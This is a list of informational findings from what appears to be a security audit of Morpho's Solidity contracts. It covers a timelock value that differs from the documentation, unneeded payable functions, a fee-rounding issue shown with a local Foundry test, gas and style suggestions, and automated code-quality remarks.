**Context:** _(No context files were provided by the reviewer)_

- Details

- In `ConstantsLib` library: the value of the inimum delay of a timelock constant `MIN_TIMELOCK` is set equal to 1 day, while in the [documentation](<https://github.com/morpho-org/metamorpho/blob/main/README.md#:~:text=All%20actions%20that%20may%20be%20against%20users%27%20interests%20(e.g.%20enabling%20a%20market%20with%20a%20high%20exposure%2C%20increasing%20the%20fee)%20are%20subject%20to%20a%20timelock%20of%20minimum%2012%20hours>) it's stated that this minimu value is 12 hours :
  > All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours.

- Context

[ConstantsLib.MIN_TIMELOCK constant](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L12C1-L13C53)

```solidity
    /// @dev The minimum delay of a timelock.
    uint256 internal constant MIN_TIMELOCK = 1 days;
```

- Recommendation

Either update the `MIN_TIMELOCK` value to match the minimum value stated by the documentation, or update the documentation to match the `MIN_TIMELOCK` value.




### Consider limiting `UrdBundler` contract interactions to URD contracts that were deployed by `URDFactory` contract

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

`UrdBundler` bundler contract is designed to allow protocol users from claiming token rewards from the universal reward distribution contracts (URD); where these contracts are deployed via `URDFactory` contract and saved in `UrdFactory.isUrd` mapping, and to limit introducing any risks to the system; it's preferred to let the users interact with URD contracts that were deployed by the `UrdFactory`.

- Context

[UrdBundler.urdClaim function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L24C1-L39C6)

```solidity
    function urdClaim(
        address distributor,
        address account,
        address reward,
        uint256 amount,
        bytes32[] calldata proof,
        bool skipRevert
    ) external payable protected {
        require(account != address(0), ErrorsLib.ZERO_ADDRESS);
        require(account != address(this), ErrorsLib.BUNDLER_ADDRESS);

        try IUniversalRewardsDistributor(distributor).claim(account, reward, amount, proof) {}
        catch (bytes memory returnData) {
            if (!skipRevert) _revert(returnData);
        }
    }
```

- Recommendation

Consider allowing `UrdBundler` contract to interact with URD contracts that were deployed via `URDFactory` contract only:

```diff
+   address public immutable URD_FACTORY;

+   constructor(address urdFactoryAddress) {
+       require(urdFactoryAddress != address(0), ErrorsLib.ZERO_ADDRESS);
+       URD_FACTORY = urdFactoryAddress;
+   }


    function urdClaim(
        address distributor,
        address account,
        address reward,
        uint256 amount,
        bytes32[] calldata proof,
        bool skipRevert
    ) external payable protected {
        require(account != address(0), ErrorsLib.ZERO_ADDRESS);
        require(account != address(this), ErrorsLib.BUNDLER_ADDRESS);

+       require(IUrdFactory(URD_FACTORY).isUrd(distributor), "not registered URD contract");

        try IUniversalRewardsDistributor(distributor).claim(account, reward, amount, proof) {}
        catch (bytes memory returnData) {
            if (!skipRevert) _revert(returnData);
        }
    }
```



### `MorphoBundler` functions are marked as payable while they shouldn't

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

- `MorphoBundler` contract is designed to enable users to manage their interactions with `Morpho` blue contract; bundling multiple interactions with one transaction.

- It was noticed that all `MorphoBundler` contract functions are marked as `payable`; while Morhpo blue markets don't support native tokens.

- Context

[MorphoBundler.morphoSetAuthorizationWithSig function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L65C1-L69C35)

```solidity
    function morphoSetAuthorizationWithSig(
        Authorization calldata authorization,
        Signature calldata signature,
        bool skipRevert
    ) external payable protected {
```

[MorphoBundler.morphoSupply function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L90C1-L97C35)

```solidity
    function morphoSupply(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
```

[MorphoBundler.morphoSupplyCollateral function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L120C1-L125C35)

```solidity
    function morphoSupplyCollateral(
        MarketParams calldata marketParams,
        uint256 assets,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
```

[MorphoBundler.morphoBorrow function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L149C1-L155C35)

```solidity
    function morphoBorrow(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address receiver
    ) external payable protected {
```

[MorphoBundler.morphoRepay function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L174C1-L181C35)

```solidity
    function morphoRepay(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
```

[MorphoBundler.morphoWithdraw function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L208C1-L214C35)

```solidity
    function morphoWithdraw(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address receiver
    ) external payable protected {
```

[MorphoBundler.morphoWithdrawCollateral function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L227C1-L231C6)

```solidity
    function morphoWithdrawCollateral(MarketParams calldata marketParams, uint256 assets, address receiver)
        external
        payable
        protected
    {
```

[MorphoBundler.morphoLiquidate function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L244C1-L251C35)

```solidity
    function morphoLiquidate(
        MarketParams calldata marketParams,
        address borrower,
        uint256 seizedAssets,
        uint256 repaidShares,
        uint256 maxRepaidAssets,
        bytes memory data
    ) external payable protected {
```

[MorphoBundler.morphoFlashLoan function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L263C5-L263C110)

```solidity
function morphoFlashLoan(address token, uint256 assets, bytes calldata data) external payable protected {
```

- Recommendation

Consider removing `payable` keyword from these functions.




### Error code must be more specific

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

Error codes in the constructor must be more specific. The same error code for each parameter make it harder to understand which parameter is oversized.

**Recommendation**:

Add some Error codes.



### `allocation.assets.zeroFloorSub(supplyAssets)` can be optimized

**Severity:** Informational

**Context:** [MetaMorpho.sol#L426-L426](metamorpho/src/MetaMorpho.sol#L426-L426)

In the `else` branch of `reallocate`, we have `withdrawn == 0`, meaning `supplyAssets.zeroFloorSub(allocation.assets) == 0`, meaning `allocation.assets >= supplyAssets`. Therefore the `allocation.assets - supplyAssets` computation can never underflow and an unchecked subtraction can be used instead of `zeroFloorSub`.



### Can use single variable in `reallocate` to keep track of balance

**Severity:** Informational

**Context:** [MetaMorpho.sol#L398-L399](metamorpho/src/MetaMorpho.sol#L398-L399)

With the current algorithm there's no need to keep track of both `totalSupplied` and `totalWithdrawn`. One can keep track of a single variable `balance` that tracks `totalWithdrawn - totalSupplied` because one cannot supply more assets than have been withdrawn first anyway, i.e., `totalWithdrawn >= totalSupplied` at any point in time *if there is no prior token contract balance* (the default case).



### Consider adding an `emergencyExit` mode

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

It's usual for vaults to have an emergency mode to exit all positions instantly, adding an extra layer of security and flexibility in case there is any issue in the protocols involved in the vault.



### Use fixed size arrays for the queues of Metamorpho

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

In the docs it says that a maximum of 30 markets are allowed in the vault, but but in the vault the supplyQueue and withdrawQueue have dynamic sizes. Consider setting them to fixed size arrays of length 30.



### Vaults that use low-decimal loan tokens may not charged fees

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When vaults uses low decimal token as loan token, it may not get performance fee due to precision loss. When `_accruedFeeShares` is triggered, it will calculate `totalInterest`. If  `totalInterest` is not 0 and configured `fee` also not 0, it will calculate `feeAssets` and `feeShares`.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L919

```solidity
    function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
        newTotalAssets = totalAssets();

        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
        if (totalInterest != 0 && fee != 0) {
>>>         uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
            // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
            // that total assets is already increased by the total interest (including the fee assets).
            feeShares =
                _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
        }
    }
```

The problem is, if loan Token use low decimal token such as [gUSD](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd) (2 decimals token), calculated `feeAssets` could result with 0 due to rounding, even though ` totalInterest` is non 0 and causing vault not taking fee when it supposed to.

**Coded PoC** : 

Add this test to `metamorpho/test/forge/MarketTest.sol` : 

```solidity
    function testNotGetFeeAfterAccrueInterest() public {
        _setFee(0.1 ether); // 10%
        address alice = address(0xABCD);
        uint256 timeElapsed = 17 hours;
        _setCap(idleParams, 0);
        _setCap(allMarkets[0], 100 * 1e2);
        loanToken.setBalance(alice, 101 * 1e2);
        vm.startPrank(alice);
        loanToken.approve(address(vault), type(uint256).max);
        loanToken.approve(address(morpho), type(uint256).max);
        vault.deposit(100 * 1e2, alice);

        collateralToken.setBalance(BORROWER, 100 * 1e2);
        // borrower borrow assets from the market
        vm.startPrank(BORROWER);
        morpho.supplyCollateral(allMarkets[0], 100 * 1e2, BORROWER, hex"");    
        morpho.borrow(allMarkets[0], 70 * 1e2, 0, BORROWER, BORROWER);
        vm.stopPrank();


        console.log("vault recorded total assets before :");
        console.log(vault.totalAssets());

        vm.warp(block.timestamp + timeElapsed);
        // deposit small amount to trigger fee accrual
        vm.prank(alice);
        vault.deposit(1, alice);
        console.log("vault assets inside market index 0 :");
        console.log(morpho.expectedSupplyAssets(allMarkets[0], address(vault)));
        console.log("vault recorded total assets after :");
        console.log(vault.totalAssets());
        console.log("share of fee recipient :");
        console.log(vault.balanceOf(FEE_RECIPIENT));
    }
```

Also add this line to `MarketTest` : 

```diff
contract MarketTest is IntegrationTest {
    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;
+   using MorphoBalancesLib for IMorpho;
    ..
}
```

Run the test : 

```shell
forge test --match-contract MarketTest --match-test testNotGetFeeAfterAccrueInterest -vvv
```

Log Output : 

```shell
Logs:
  vault recorded total assets before :
  10000

  vault assets inside market index 0 :
  10005

  vault recorded total assets after :
  10006

  share of fee recipient :
  0
```

It can be observed that fee recipient did not get any share even though vault accrue interest.

**Recommendation**:

Several things can be done, rounding up when calculating `feeAssets` is generally a good idea. Reverting the call when interest is non 0 but `feeAssets` result in 0 can also be done, although might hurt user experience. Or explicitly state in documentation that low decimals token such as gUSD is not supported.



### Merkle tree gas risks

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
`UniversalRewardDistributor` uses merkle trees to share rewards.When verifying a proof in a Merkle tree within a blockchain contract, the process involves iteratively hashing, which can lead to increased computational demands. The size of the proof directly corresponds to the number of members in the Merkle tree. Consequently, a larger number of merkle members and proof size can escalate gas costs significantly, potentially causing a surge in the expense of claiming or, in extreme scenarios, leading to running out of gas.

**Recommendation**:
To address this challenge and enhance scalability, it is strongly advised to employ gas-optimized Merkle tree libraries, such as Solady's [MerkleProofLib](https://github.com/Vectorized/solady/blob/main/src/utils/MerkleProofLib.sol). These specialized libraries are designed to streamline the verification process, efficiently managing gas consumption and ultimately resulting in substantial savings. By adopting such gas-optimized solutions, users can ensure a more cost-effective and scalable implementation of Merkle tree verification within blockchain contracts.



### Upgrade solidity to at least `0.8.20`	_(duplicate of [Different solidity versions across the code base])_

**Severity:** Informational

**Context:** [UniversalRewardsDistributor.sol#L2-L2](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L2-L2), [UrdFactory.sol#L2-L2](universal-rewards-distributor/src/UrdFactory.sol#L2-L2)

**Description**: Current version `0.8.19` is incompatible with current openzeppellin library which requires at least `0.8.20`, quote from [OZ changelog](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/CHANGELOG.md#general)
> Bumped minimum compiler version required to 0.8.20 (https://github.com/OpenZeppelin/openzeppelin-contracts/pull/4288, https://github.com/OpenZeppelin/openzeppelin-contracts/pull/4489)

**Recommendation**: Upgrade to at least solidity 0.8.20 if you plan to use current supproted version of  Openzeppelin



### Typos in `GoerliLib`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

In the GoerliLib, where Goerli's WETH and WST WETH contract addresses are saved, in the docs it says /// _@dev The address of the WETH contract on Ethereum._ and  _/// @dev The address of the wstETH contract on Ethereum._ when it should be _for Goerli_.



### Consider adding deadlines to `MorphoBundler`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

In the MorphoBlunder contract the user can enter some parameters that protect him from getting less/more shares/assets than expected such as `slippageAmount`. Since this contract is intended to work as a router for the users to interact with the protocol safely, consider adding a timestamp protecion too adding a `deadline` parameter too, just like Uniswap V3 [Router](https://github.com/Uniswap/v3-periphery/blob/main/contracts/SwapRouter.sol), to protect him from the transaction happening at a unwanted time.





### Consider handling reverting markets in `MetaMorpho::_supplyMorpho`

**Severity:** Informational

**Context:** [MetaMorpho.sol#L813-L813](metamorpho/src/MetaMorpho.sol#L813-L813)

**Description**:
In the function the contract tries to supply to the markets of the supply queue and skipping the reverting ones, but the reverts could repèat more than once, so it would make sense to add some logic to handle this in the `catch{}` part of the try/catch logic.

**Recommendation**:
Consider reducing the supply caps of the frquently reverting markets or change their position in the supply queue so the first one of the queue always works.



### `owner` doesnt need tokens to perform the test

**Severity:** Informational

**Context:** [UniversalRewardsDistributorTest.sol#L56-L57](universal-rewards-distributor/test/UniversalRewardsDistributorTest.sol#L56-L57)

This is out of scope but i think it better to remove this lines or removing the mintint tokens to the contract lines and make the owner transfer the tokens to the contract to represent a more realistic flow.



### Loss of precision

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (1)*:

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

106:         SCALE_FACTOR = 10
107:                 ** (
108:                     36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals
109:                         - baseFeed1.getDecimals() - baseFeed2.getDecimals()
110:                 ) / vaultConversionSample;

```

[106-110](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L106-L110)



### `assembly` blocks should have extensive comments

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Assembly blocks are take a lot more time to audit than normal Solidity code, and often have gotchas and side-effects that the Solidity versions of the same code do not. Consider adding more comments explaining what is being done in every step of the assembly code

*Instances (4)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

80:         assembly ("memory-safe") {
81:                revert(add(32, returnData), length)
82:            }

```

[80-82](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L80-L82)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

12:         assembly {
13:                // z = min(x, high).
14:                z := xor(x, mul(xor(x, high), slt(high, x)))
15:                // z = max(z, low).
16:                z := xor(z, mul(xor(z, low), sgt(low, z)))
17:            }

```

[12-17](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L12-L17)





### Add inline comments for unnamed variables

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_



```solidity

function foo(address x, address) -> function foo(address x, address /* y */)

```

*Instances (22)*:

<summary>see instances</summary>


```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit  parameter 1,
531:     function maxDeposit(address) public view override returns (uint256) {

/// @audit  parameter 1,
536:     function maxMint(address) public view override returns (uint256) {

```

[531](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531), [536](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit  parameter 1,
19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

/// @audit  parameter 1,
24:     function transferOwnership(address) external;

/// @audit  parameter 1,
43:     function supplyQueue(uint256) external view returns (Id);

/// @audit  parameter 1,
45:     function withdrawQueue(uint256) external view returns (Id);

/// @audit  parameter 1,
65:     function skim(address) external;

/// @audit  parameter 1,
71:     function setSkimRecipient(address) external;

/// @audit  parameter 1,
81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

/// @audit  parameter 1,
83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

/// @audit  parameter 1,
92:     function config(Id) external view returns (MarketConfig memory);

/// @audit  parameter 1,
94:     function pendingCap(Id) external view returns (PendingUint192 memory);

```

[19](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L24), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L43), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L45), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L65), [71](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L71), [81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit  parameter 1,
34:     function onMorphoSupply(uint256, bytes calldata data) external {

/// @audit  parameter 1,
39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external {

/// @audit  parameter 1,
44:     function onMorphoRepay(uint256, bytes calldata data) external {

/// @audit  parameter 1,
49:     function onMorphoLiquidate(uint256, bytes calldata data) external {

/// @audit  parameter 1,
54:     function onMorphoFlashLoan(uint256, bytes calldata data) external {

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit  parameter 1,
7:     function balanceOf(address) external view returns (uint256);

```

[7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit  parameter 1,
7:     function balanceOf(address) external view returns (uint256);

```

[7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit  parameter 1,
5:     function convertToAssets(uint256) external view returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit  parameter 1,
22:     function isUpdater(address) external view returns (bool);

/// @audit  parameter 1, parameter 2,
23:     function claimed(address, address) external view returns (uint256);

```

[22](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L22), [23](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L23)




### Consider adding a deny-list

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Doing so will significantly increase centralization, but will help to prevent hackers from using stolen tokens to understand the purpose of each mapping

*Instances (6)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

16: contract ERC20PermissionedBase is ERC20Wrapper, ERC20Permit {

```

[16](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L16)

```solidity
File: metamorpho/src/MetaMorpho.sol

43: contract MetaMorpho is ERC4626, ERC20Permit, Ownable2Step, Multicall, IMetaMorphoStaticTyping {

```

[43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L43)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

13: contract MetaMorphoFactory {

```

[13](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L13)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

91: interface IMetaMorpho is IMetaMorphoBase, IERC4626, IERC20Permit, IOwnable, IMulticall {

```

[91](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L91)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

21: contract EthereumBundler is
22:        TransferBundler,
23:        EthereumPermitBundler,
24:        Permit2Bundler,
25:        ERC4626Bundler,
26:        WNativeBundler,
27:        EthereumStEthBundler,
28:        UrdBundler,
29:        MorphoBundler,
30:        ERC20WrapperBundler

```

[21-30](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L21-L30)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

12: contract UrdFactory {

```

[12](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L12)




### Consider adding emergency-stop functionality

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Adding a way to quickly halt protocol functionality in an emergency, rather than having to pause individual contracts one-by-one, will make in-progress hack mitigation faster and much less stressful.

*Instances (1)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

43: contract MetaMorpho is ERC4626, ERC20Permit, Ownable2Step, Multicall, IMetaMorphoStaticTyping {

```

[43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L43)



### Consider disabling `renounceOwnership()`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

If the plan for your project does not include eventually giving up all ownership control, consider overwriting OpenZeppelin's `Ownable`'s `renounceOwnership()` function in order to disable it.

*Instances (1)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

43: contract MetaMorpho is ERC4626, ERC20Permit, Ownable2Step, Multicall, IMetaMorphoStaticTyping {

```

[43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L43)



### Consider using `delete` rather than assigning zero to clear values

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

he `delete` keyword more closely matches the semantics of what is being done, and draws more attention to the changing of state, which may lead to a more thorough audit of its associated logic.

*Instances (1)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

784:             marketConfig.removableAt = 0;

```

[784](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L784)




### Consistent usage of `require` vs custom `error`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider using the same approach throughout the codebase to improve the consistency of the code.

`require` used: 84

`custom error` used: 47 



### Constant redefined elsewhere

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.

*Instances (3)*:

```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit seen in metamorpho/src/MetaMorpho.sol, metamorpho/src/MetaMorphoFactory.sol, morpho-blue-bundlers/src/MorphoBundler.sol, morpho-blue-irm/src/AdaptiveCurveIrm.sol, 
25:     address public immutable MORPHO;

```

[25](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L25)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

/// @audit seen in morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol, 
26:     address public immutable WST_ETH;

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L26)

```solidity
File: morpho-blue-bundlers/src/libraries/ErrorsLib.sol

/// @audit seen in morpho-blue/src/libraries/ErrorsLib.sol, morpho-blue-irm/src/libraries/ErrorsLib.sol, 
21:     string internal constant ZERO_ADDRESS = "zero address";

```

[21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ErrorsLib.sol#L21)




### Constants in comparisons should appear on the left side

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Doing so will prevent [typo bugs](https://www.moserware.com/2008/01/constants-on-left-are-better-but-this.html).

*Instances (68)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit == 0
177:         if (validAt == 0) revert ErrorsLib.NoPendingValue();

/// @audit != 0
236:         if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

/// @audit != 0
250:         if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();

/// @audit != 0
271:             if (pendingGuardian.validAt != 0 && newGuardian == pendingGuardian.value) {

/// @audit == 0
289:         if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

/// @audit != 0
309:         if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();

/// @audit == 0
331:             if (config[newSupplyQueue[i]].cap == 0) revert ErrorsLib.UnauthorizedMarket(newSupplyQueue[i]);

/// @audit != 0
368:                 if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

/// @audit != 0
370:                 if (MORPHO.supplyShares(id, address(this)) != 0) {

/// @audit == 0
371:                     if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

/// @audit > 0
407:             if (withdrawn > 0) {

/// @audit == 0
412:                 if (allocation.assets == 0) {

/// @audit == 0
428:                 if (suppliedAssets == 0) continue;

/// @audit == 0
431:                 if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);

/// @audit == 0
452:         if (pendingTimelock.validAt == 0) revert ErrorsLib.NoPendingValue();

/// @audit == 0
461:         if (pendingGuardian.validAt == 0) revert ErrorsLib.NoPendingValue();

/// @audit == 0
470:         if (pendingCap[id].validAt == 0) revert ErrorsLib.NoPendingValue();

/// @audit == 0
647:             if (supplyCap == 0) continue;

/// @audit > 0
769:         if (supplyCap > 0) {

/// @audit == 0
802:             if (supplyCap == 0) continue;

/// @audit > 0
809:             if (toSupply > 0) {

/// @audit == 0
816:             if (assets == 0) return;

/// @audit != 0
819:         if (assets != 0) revert ErrorsLib.AllCapsReached();

/// @audit > 0
833:             if (toWithdraw > 0) {

/// @audit == 0
840:             if (assets == 0) return;

/// @audit != 0
843:         if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();

/// @audit == 0
870:             if (assets == 0) break;

/// @audit != 0
907:         if (feeShares != 0) _mint(feeRecipient, feeShares);

/// @audit != 0
918:         if (totalInterest != 0 && fee != 0) {

/// @audit != 0
918:         if (totalInterest != 0 && fee != 0) {

```

